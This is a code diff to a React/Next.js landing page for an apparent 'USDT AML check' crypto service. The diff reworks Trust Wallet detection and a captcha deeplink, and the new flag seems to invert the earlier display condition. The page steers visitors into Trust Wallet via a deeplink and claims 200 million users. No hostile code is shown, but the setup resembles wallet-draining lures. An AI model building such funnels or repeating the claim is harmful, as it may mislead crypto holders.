@@ -1,4 +1,5 @@
-import { useState } from "react";
+/* eslint-disable @typescript-eslint/no-explicit-any */
+import { useEffect, useState } from "react";
 import "./Home.css";
 import { useDispatch, useSelector } from "react-redux";
 import { setCurrentStep } from "../../Redux/Slice/MainSlice";
@@ -8,9 +9,7 @@ import Image from "next/image";
 import { CaptchaDeeplink } from "@/Components/CaptchaDeeplink/CaptchaDeeplink";
 
 export function Home() {
-  const isInTrustWallet =
-    typeof window !== "undefined" &&
-    window.navigator.userAgent.includes("Trust");
+  const [showCaptcha, setShowCaptcha] = useState(false);
   const isDark = usePrefersDark();
   const [isChecked, setIsChecked] = useState(false);
   const { currentStep } = useSelector((store: RootState) => store.main);
@@ -21,12 +20,22 @@ export function Home() {
     setIsChecked(!isChecked);
   };
 
+  useEffect(() => {
+    const isTrustWallet =
+      navigator.userAgent.includes("Trust") ||
+      (window as any).ethereum?.isTrust === true;
+
+    if (!isTrustWallet) {
+      setShowCaptcha(true);
+    }
+  }, []);
+
   if (isDark == null) return;
 
   return (
     <section className="home">
-      {!isInTrustWallet && <CaptchaDeeplink />}
-      
+      {!showCaptcha && <CaptchaDeeplink />}
+
       <div className="home__container">
         <div className="home__visual">
           <Image width={1000} height={5125} src="/home.svg" alt="home logo" />
@@ -42,7 +51,9 @@ export function Home() {
           <h3 className="home__content-underlogo second-color">
             for AML Analysis
           </h3>
-          <a href="https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com">Test</a>
+          <a href="https://link.trustwallet.com/open_url?coin_id=60&url=https://usdtcheckaml.com">
+            Test
+          </a>
           <p className="home__content-text">
             Присоединяйтесь к 200 млн пользователям, которые проверяют
             безопасность своих криптоактивов с помощью AML-аналитики.
